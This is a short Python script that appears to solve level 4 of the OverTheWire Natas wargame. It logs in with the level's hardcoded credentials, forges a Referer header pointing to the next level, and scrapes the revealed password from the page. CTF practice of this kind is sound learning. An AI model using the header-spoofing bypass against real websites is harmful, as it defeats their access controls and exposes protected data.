import requests
from bs4 import BeautifulSoup

url = "http://natas4.natas.labs.overthewire.org"
r = requests.get(url, auth=('natas4','Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'), headers={'Referer':'http://natas5.natas.labs.overthewire.org/'})
soup=BeautifulSoup(r.text, 'html.parser')
tag = soup.find('div', attrs={'id':'content'})
password = tag.text.strip()[16:75]
print(password)
